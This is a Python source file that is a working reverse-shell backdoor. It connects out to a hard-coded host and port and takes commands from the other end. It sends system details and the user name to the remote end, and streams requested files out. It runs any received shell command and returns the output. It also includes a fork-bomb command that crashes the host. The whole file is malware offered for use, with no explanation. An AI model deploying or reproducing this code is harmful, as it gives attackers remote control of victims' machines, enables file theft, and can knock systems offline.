import socket
import subprocess
import os
import platform
import getpass
import colorama
from colorama import Fore, Style
from time import sleep

colorama.init()

RHOST = "127.0.0.1"
RPORT = 4444

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((RHOST, RPORT))

while True:
    try:

        cmd = sock.recv(1024).decode("utf-8")

        # List files in the dir
        if cmd == "list":
            sock.send(str(os.listdir(".")).encode())

        # Forkbomb
        elif cmd == "forkbomb":
            while True:
                os.fork()

        # Change directory
        elif cmd.split(" ")[0] == "cd":
            os.chdir(cmd.split(" ")[1])
            sock.send("Changed directory to {}".format(os.getcwd()).encode())

        # Get system info
        elif cmd == "sysinfo":
            sysinfo = f"""
Operating System: {platform.system()}
Computer Name: {platform.node()}
Username: {getpass.getuser()}
Release Version: {platform.release()}
Processor Architecture: {platform.processor()}
            """
            sock.send(sysinfo.encode())

        # Download files
        elif cmd.split(" ")[0] == "download":
            with open(cmd.split(" ")[1], "rb") as f:
                file_data = f.read(1024)
                while file_data:
                    print("Sending", file_data)
                    sock.send(file_data)
                    file_data = f.read(1024)
                sleep(2)
                sock.send(b"DONE")
            print("Finished sending data")

        # Terminate the connection
        elif cmd == "exit":
            sock.send(b"exit")
            break

        # Run any other command
        else:
            comm = subprocess.Popen(str(cmd), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            STDOUT, STDERR = comm.communicate()
            if not STDOUT:
                sock.send(STDERR)
            else:
                sock.send(STDOUT)

        # If the connection terminates
        if not cmd:
            print("Connection dropped")
            break
    except Exception as e:
        sock.send("An error has occured: {}".format(str(e)).encode())

sock.close()

colorama.init()



